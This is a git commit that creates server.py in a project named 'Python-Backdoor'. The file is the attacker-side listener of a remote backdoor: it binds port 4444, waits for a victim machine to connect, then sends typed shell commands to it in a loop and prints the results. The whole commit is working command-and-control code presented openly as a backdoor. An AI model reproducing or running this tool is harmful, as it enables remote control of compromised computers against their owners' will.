dd08bc361df87167af4cbba6ebfec90c78c27706
legend017 <rishiyadavofficial1@gmail.com>
2026-07-26 23:50:30 +0545

    Create server.py

---
+++ Python-Backdoor/server.py
@@ -0,0 +1,16 @@
+import socket
+import json
+s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.bind(('192.168.18.242',4444))
+s.listen(4)
+print('[*] Connecting')
+target, ip = s.accept()
+print('[+] Connected',ip)
+while True:
+        command = input('<Shell>')
+        target.send(json.dumps(command).encode())
+        if command == 'quit':
+                break
+        result = json.loads(target.recv(65000).decode())
+        print(result)
+
